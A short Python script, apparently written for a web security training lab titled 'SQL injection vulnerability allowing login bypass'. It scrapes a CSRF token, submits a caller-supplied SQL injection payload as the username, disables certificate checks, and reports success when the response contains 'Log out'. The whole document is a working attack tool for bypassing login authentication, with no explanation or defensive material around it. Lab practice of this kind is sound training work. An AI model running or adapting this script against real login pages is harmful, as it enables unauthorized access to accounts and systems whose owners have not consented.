import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection vulnerability allowing login bypass"

def get_csrf_token(session, url, proxies=None):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def run(url, payload, proxies=None):
    """
    SQLi login bypass with CSRF token and session management
    """
    session = requests.Session()
    try:
        csrf = get_csrf_token(session, url, proxies)
        data = {
            "csrf": csrf,
            "username": payload,
            "password": "anything"
        }

        r = session.post(url, data=data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            return True
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False
